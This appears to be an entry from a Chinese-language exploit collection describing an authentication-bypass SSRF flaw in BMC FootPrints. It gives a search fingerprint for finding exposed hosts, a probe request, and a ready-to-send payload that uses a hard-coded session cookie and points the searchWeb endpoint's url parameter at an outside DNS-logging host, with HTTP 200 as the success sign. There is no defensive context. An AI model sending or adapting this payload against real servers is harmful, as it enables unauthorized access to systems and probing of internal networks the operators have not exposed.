# BMC_FootprintssearchWeb存在认证绕过SSRF漏洞

BMC ｜ SSRF ｜ —
- **指纹**：`icon_hash="-1106787596"`
- **请求**：`GET /footprints/servicedesk/passwordreset/request/ HTTP/1.1`

**Payload**
```
GET /footprints/servicedesk/import/searchWeb?url=http://dnslog.cn&dataEncoding=x HTTP/1.1
Host:
Cookie: SEC_TOKEN=p1n5K6N8GdSFer7qewJKxU-3gBlPcPFMq1oAhZqT7rk+0KwcRI
```
- **响应特征**：200